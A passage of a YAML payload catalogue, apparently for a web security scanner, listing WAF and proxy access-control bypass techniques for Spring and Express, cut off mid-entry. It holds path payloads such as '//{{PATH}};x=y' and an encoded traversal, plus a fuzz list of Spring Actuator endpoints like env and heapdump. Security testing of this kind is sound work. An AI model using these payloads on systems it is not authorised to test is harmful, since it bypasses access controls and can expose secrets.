    tags: ["spring", "spring-boot", "actuator", "sensitive-endpoint"]
    risk: "safe"
    severity: "high"
    priority: 2
    scanner_note: >
      Fuzz {{ACTUATOR_ENDPOINT}} with: health, env, beans, mappings,
      heapdump, threaddump, loggers, metrics, info, configprops,
      httptrace, scheduledtasks, caches, flyway, liquibase

  - id: "proxy-spring-002"
    name: "Spring — double slash semicolon combo"
    category: "proxy_specific"
    technique: "combination"
    server: "spring"
    payload: "//{{PATH}};x=y"
    description: >
      Double slash + matrix param combined — Spring strips both the double
      slash and the semicolon segment; the WAF sees neither /path nor a
      clean match on its ACL rules.
    tags: ["spring", "matrix", "double-slash", "combination"]
    risk: "safe"
    severity: "high"
    priority: 2

  - id: "proxy-express-001"
    name: "Express.js — path-to-regexp bypass"
    category: "proxy_specific"
    technique: "encoding"
    server: "express"
    payload: "/{{PATH}}%2F%2E%2E%2F"
    description: >
      Express path-to-regexp normalization gap — Express decodes the path
